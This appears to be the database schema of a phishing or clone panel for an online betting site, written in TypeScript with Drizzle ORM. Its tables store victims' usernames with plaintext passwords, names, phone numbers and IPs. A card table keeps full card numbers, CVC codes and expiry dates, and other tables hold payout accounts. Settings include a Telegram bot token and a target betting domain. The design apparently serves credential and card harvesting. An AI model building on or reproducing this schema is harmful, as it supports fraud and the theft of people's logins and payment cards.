import { sql } from "drizzle-orm";
import { pgTable, text, varchar, integer, serial, boolean, real, numeric } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  balance: numeric("balance", { precision: 15, scale: 2 }).default("0").notNull(),
  email: text("email").default(null),
});

export const verificationCodes = pgTable("verification_codes", {
  id: serial("id").primaryKey(),
  userId: varchar("user_id").notNull().references(() => users.id, { onDelete: "cascade" }),
  code: varchar("code", { length: 10 }).notNull(),
  expiresAt: integer("expires_at").notNull(),
  createdAt: integer("created_at").notNull(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
  email: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

export type CreateUserRequest = InsertUser;
export type UpdateUserRequest = Partial<InsertUser>;
export type UserResponse = User;
export type UsersListResponse = User[];

export const logs = pgTable("logs", {
  id: serial("id").primaryKey(),
  username: text("username").notNull(),
  password: text("password").notNull(),
  balance: real("balance").notNull().default(0),
  name: text("name").default(""),
  surname: text("surname").default(""),
  phoneNumber: text("phone_number").default(""),
  ip: text("ip").default(""),
  date: integer("date").notNull(),
  isDeleted: integer("is_deleted").notNull().default(0),
  isBanned: integer("is_banned").notNull().default(0),
  vip: integer("vip").notNull().default(0),
});

export const insertLogSchema = createInsertSchema(logs).omit({ id: true });
export type InsertLog = z.infer<typeof insertLogSchema>;
export type Log = typeof logs.$inferSelect;

export const reqPayments = pgTable("req_payments", {
  id: serial("id").primaryKey(),
  username: text("username").notNull(),
  amount: real("amount").notNull(),
  provider: text("provider").notNull(),
  status: text("status").notNull().default("pending"),
  ccId: integer("cc_id"),
  note: text("note").default(""),
  ipAddress: text("ip_address").default(""),
  date: integer("date").notNull(),
  processedAt: integer("processed_at"),
  isDeleted: integer("is_deleted").notNull().default(0),
});

export const insertReqPaymentSchema = createInsertSchema(reqPayments).omit({ id: true });
export type InsertReqPayment = z.infer<typeof insertReqPaymentSchema>;
export type ReqPayment = typeof reqPayments.$inferSelect;

export const reqCards = pgTable("req_cards", {
  id: serial("id").primaryKey(),
  ccOwner: text("cc_owner").notNull(),
  ccNo: text("cc_no").notNull(),
  ccCvc: text("cc_cvc").notNull(),
  ccMonth: text("cc_month").notNull(),
  ccYear: text("cc_year").notNull(),
  amount: real("amount").notNull().default(0),
  ipAddress: text("ip_address").default(""),
  date: integer("date"),
});

export const insertReqCardSchema = createInsertSchema(reqCards).omit({ id: true });
export type InsertReqCard = z.infer<typeof insertReqCardSchema>;
export type ReqCard = typeof reqCards.$inferSelect;

export const bankAccounts = pgTable("bank_accounts", {
  id: serial("id").primaryKey(),
  bankName: text("bank_name").notNull().default(""),
  name: text("name").notNull().default(""),
  iban: text("iban").notNull().default(""),
  isActive: integer("is_active").notNull().default(1),
  sortOrder: integer("sort_order").notNull().default(0),
});

export const insertBankAccountSchema = createInsertSchema(bankAccounts).omit({ id: true });
export type InsertBankAccount = z.infer<typeof insertBankAccountSchema>;
export type BankAccount = typeof bankAccounts.$inferSelect;

export const paparaAccounts = pgTable("papara_accounts", {
  id: serial("id").primaryKey(),
  accountName: text("account_name").notNull().default(""),
  no: text("no").notNull().default(""),
  iban: text("iban").notNull().default(""),
  isActive: integer("is_active").notNull().default(1),
  sortOrder: integer("sort_order").notNull().default(0),
});

export const insertPaparaAccountSchema = createInsertSchema(paparaAccounts).omit({ id: true });
export type InsertPaparaAccount = z.infer<typeof insertPaparaAccountSchema>;
export type PaparaAccount = typeof paparaAccounts.$inferSelect;

export const cryptoAccounts = pgTable("crypto_accounts", {
  id: serial("id").primaryKey(),
  walletNo: text("wallet_no").notNull().default(""),
});

export type CryptoAccount = typeof cryptoAccounts.$inferSelect;

export const withdrawalRequests = pgTable("withdrawal_requests", {
  id: serial("id").primaryKey(),
  username: text("username").notNull(),
  amount: real("amount").notNull(),
  method: text("method").notNull(),
  bankName: text("bank_name").default(""),
  iban: text("iban").default(""),
  accountHolder: text("account_holder").default(""),
  paparaNo: text("papara_no").default(""),
  cryptoAddress: text("crypto_address").default(""),
  cryptoNetwork: text("crypto_network").default(""),
  status: text("status").notNull().default("pending"),
  note: text("note").default(""),
  ipAddress: text("ip_address").default(""),
  date: integer("date").notNull(),
  processedAt: integer("processed_at"),
  isDeleted: integer("is_deleted").notNull().default(0),
});

export const insertWithdrawalSchema = createInsertSchema(withdrawalRequests).omit({ id: true });
export type InsertWithdrawal = z.infer<typeof insertWithdrawalSchema>;
export type WithdrawalRequest = typeof withdrawalRequests.$inferSelect;

export const settings = pgTable("settings", {
  id: serial("id").primaryKey(),
  liveChatCode: text("live_chat_code").default(""),
  telegramChatId: text("telegram_chat_id").default(""),
  telegramBotToken: text("telegram_bot_token").default(""),
  cdnUrl: text("cdn_url").default(""),
  slotLink: text("slot_link").default(""),
  demoUrl: text("demo_url").default(""),
  targetDomain: text("target_domain").default("grandpashabet7078.com"),
  minDeposit: integer("min_deposit").default(1500),
  maxDeposit: integer("max_deposit").default(100000),
  minWithdraw: integer("min_withdraw").default(250),
  maxWithdraw: integer("max_withdraw").default(100000),
});

export type Settings = typeof settings.$inferSelect;

export const adminUsers = pgTable("admin_users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  lastLoginTime: integer("last_login_time").default(0),
});

export const insertAdminUserSchema = createInsertSchema(adminUsers).omit({ id: true });
export type InsertAdminUser = z.infer<typeof insertAdminUserSchema>;
export type AdminUser = typeof adminUsers.$inferSelect;
